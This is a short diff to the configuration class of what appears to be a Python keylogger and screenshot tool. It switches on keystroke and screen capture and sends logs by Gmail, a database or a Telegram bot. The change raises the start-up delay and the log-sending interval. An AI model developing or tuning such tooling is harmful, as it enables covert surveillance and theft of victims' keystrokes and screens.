@@ -47,8 +47,8 @@ class Config:
         self.SCREENSHOT = True                                  # active or disable function Screenshot
         self.KEYLOGGER = True                                   # active or disable function Keylogger
         self.TIME_SCREENSHOT = 30 #[seconds]                    # Tiempo de intervalo de ScreenShot
-        self.DELAY  = 1                                         # tiempo de retraso para evitar sobrecargos al iniciar
-        self.TIME_SEND = 1 #[minutos]                           # Tiempo de envió del registro
+        self.DELAY  = 10                                         # tiempo de retraso para evitar sobrecargos al iniciar
+        self.TIME_SEND = 15 #[minutos]                           # Tiempo de envió del registro
         self.MODE_SEND = 2      # 0 = Gmail
                                 # 1 = DataBase                  # Solo se puede usar una opción
                                 # 2 = TelegramBot
